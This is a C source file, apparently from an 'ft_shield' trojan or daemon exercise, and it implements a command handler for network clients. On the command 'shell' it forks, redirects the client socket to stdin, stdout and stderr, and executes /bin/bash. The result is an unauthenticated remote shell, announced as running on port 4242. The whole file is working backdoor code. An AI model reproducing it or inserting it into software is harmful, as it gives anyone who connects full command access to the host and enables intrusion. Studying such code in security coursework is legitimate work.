#include <ft_shield.h>

static void help(t_server* server, int client_fd)
{
    send_to_client(server, client_fd, "HELP\n");
}

static void shell(t_server* server, int client_fd)
{
    pid_t pid;
    if ((pid = fork()) < 0) {
        remove_client(server, client_fd);
        return ;
    }
    if (pid == 0) {
        send_to_client(server, client_fd, "Spawning shell on port 4242\n");
        dup2(client_fd, 0);
        dup2(client_fd, 1);
        dup2(client_fd, 2);
        execl("/bin/bash", "bash", NULL);
        exit(EXIT_FAILURE);
    }
}

void handle_command(t_server* server, int client_fd, char* buffer)
{
    if (!strcmp("?", buffer))
        help(server, client_fd);
    else if (!strcmp("shell", buffer))
        shell(server, client_fd);
}
